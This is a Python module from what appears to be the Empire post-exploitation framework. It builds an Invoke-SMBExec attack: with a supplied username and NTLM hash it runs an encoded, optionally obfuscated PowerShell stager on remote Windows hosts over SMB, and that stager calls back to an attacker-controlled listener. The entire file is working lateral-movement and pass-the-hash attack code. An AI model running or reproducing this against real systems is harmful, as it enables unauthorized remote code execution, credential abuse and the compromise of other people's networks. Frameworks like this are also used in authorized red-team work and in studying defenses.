from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Invoke-SMBExec',

            'Author': ['@rvrsh3ll'],

            'Description': ('Executes a stager on remote hosts using SMBExec.ps1'),

            'Background' : False,

            'OutputExtension' : None,
            
            'NeedsAdmin' : False,

            'OpsecSafe' : True,

            'Language' : 'powershell',

            'MinLanguageVersion' : '2',
            
            'Comments': ["https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/master/Invoke-SMBExec.ps1"]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'CredID' : {
                'Description'   :   'CredID from the store to use.',
                'Required'      :   False,
                'Value'         :   ''                
            },
            'ComputerName' : {
                'Description'   :   'Host[s] to execute the stager on, comma separated.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Username' : {
                'Description'   :   'Username.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Domain' : {
                'Description'   :   'Domain.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Hash' : {
                'Description'   :   'NTLM Hash in LM:NTLM or NTLM format.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Service' : {
                'Description'   :   'Name of service to create and delete. Defaults to 20 char random.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Listener' : {
                'Description'   :   'Listener to use.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'Proxy' : {
                'Description'   :   'Proxy to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'ProxyCreds' : {
                'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self, obfuscate=False, obfuscationCommand=""):
        
        listenerName = self.options['Listener']['Value']
        computerName = self.options['ComputerName']['Value']
        userName = self.options['Username']['Value']
        NTLMhash = self.options['Hash']['Value']
        domain = self.options['Domain']['Value']
        service = self.options['Service']['Value']
        userAgent = self.options['UserAgent']['Value']
        proxy = self.options['Proxy']['Value']
        proxyCreds = self.options['ProxyCreds']['Value']

        moduleSource = self.mainMenu.installPath + "/data/module_source/lateral_movement/Invoke-SMBExec.ps1"
        if obfuscate:
            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
        try:
            f = open(moduleSource, 'r')
        except:
            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
            return ""

        moduleCode = f.read()
        f.close()

        script = moduleCode




        if not self.mainMenu.listeners.is_listener_valid(listenerName):
            # not a valid listener, return nothing for the script
            print helpers.color("[!] Invalid listener: " + listenerName)
            return ""

        else:

            # generate the PowerShell one-liner with all of the proper options set
            launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)

            if launcher == "":
                print helpers.color("[!] Error in launcher generation.")
                return ""
            else:

                stagerCmd = '%COMSPEC% /C start /b C:\\Windows\\System32\\WindowsPowershell\\v1.0\\' + launcher
                scriptEnd = "Invoke-SMBExec -Target %s -Username %s -Domain %s -Hash %s -Command '%s'" % (computerName, userName, domain, NTLMhash, stagerCmd)


        scriptEnd += "| Out-String | %{$_ + \"`n\"};"
        if obfuscate:
            scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
        script += scriptEnd
        return script
